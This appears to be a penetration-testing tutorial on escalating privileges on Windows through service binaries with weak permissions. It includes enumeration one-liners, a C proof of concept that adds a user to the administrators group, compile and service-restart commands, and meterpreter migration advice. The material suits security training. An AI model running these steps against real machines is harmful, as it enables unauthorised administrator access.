## Weak Service Permission

### Basic steps to take

Services on windows are programs that run in the background. Without a GUI.

If you find a service that has write permissions set to ``everyone`` you can change that binary into your custom binary and make it execute in the privileged context.

First we need to find services. That can be done using ``wmci`` or ``sc.exe``. Wmci is not available on all windows machines, and it might not be available to your user. If you don't have access to it, you can use ``sc.exe``.

**WMCI**
```
wmic service list brief
```

This will produce a lot out output and we need to know which one of all of these services have weak permissions. In order to check that we can use the ``icacls`` program. Notice that ``icacls`` is only available from Vista and up. XP and lower has ``cacls`` instead.

As you can see in the command below you need to make sure that you have access to ``wimc``, ``icacls`` and write privilege in ``C:\windows\temp``.

```
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> c:\windows\temp\permissions.txt
```

```
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"
```

Binaries in system32 are excluded since they are mostly correct, since they are installed by windows.

**sc.exe**

```
sc query state= all | findstr "SERVICE_NAME:" >> Servicenames.txt

FOR /F %i in (Servicenames.txt) DO echo %i
type Servicenames.txt

FOR /F "tokens=2 delims= " %i in (Servicenames.txt) DO @echo %i >> services.txt

FOR /F %i in (services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> path.txt
```
Now you can process them one by one with the cacls command.

```
cacls "C:\path\to\file.exe"
```

**Look for Weakness**

What we are interested in is binaries that have been installed by the user. In the output you want to look for ``BUILTIN\Users:(F)``. Or where your user/usergroup has ``(F)`` or ``(C)`` rights.

*Example:*

```
C:\path\to\file.exe 
BUILTIN\Users:F
BUILTIN\Power Users:C 
BUILTIN\Administrators:F 
NT AUTHORITY\SYSTEM:F
```

That means your user has write access. So you can just rename the ``.exe`` file and then add your own malicious binary. And then restart the program and your binary will be executed instead. This can be a simple getsuid program or a reverse shell that you create with msfvenom.

Here is a POC code for getsuid.

```
#include <stdlib.h>
int main ()
{
int i;
    i = system("net localgroup administrators theusername /add");
return 0;
}
```
We then compile it with mingw like this:

```
i686-w64-mingw32-gcc windows-exp.c -lws2_32 -o exp.exe
```
Restart the Service

Okay, so now that we have a malicious binary in place we need to restart the service so that it gets executed. We can do this by using ``wmic`` or ``net`` the following way:

```
wmic service NAMEOFSERVICE call startservice
```
```
net stop [service name] && net start [service name].
```
The binary should now be executed in the SYSTEM or Administrator context.

**Migrate the meterpreter shell**

If your meterpreter session dies right after you get it you need migrate it to a more stable service. A common service to migrate to is winlogon.exe since it is run by system and it is always run. You can find the PID like this:

```
wmic process list brief | find "winlogon"
```
So when you get the shell you can either type migrate PID or automate this so that meterpreter automatically migrates.

http://chairofforgetfulness.blogspot.cl/2014/01/better-together-scexe-and.html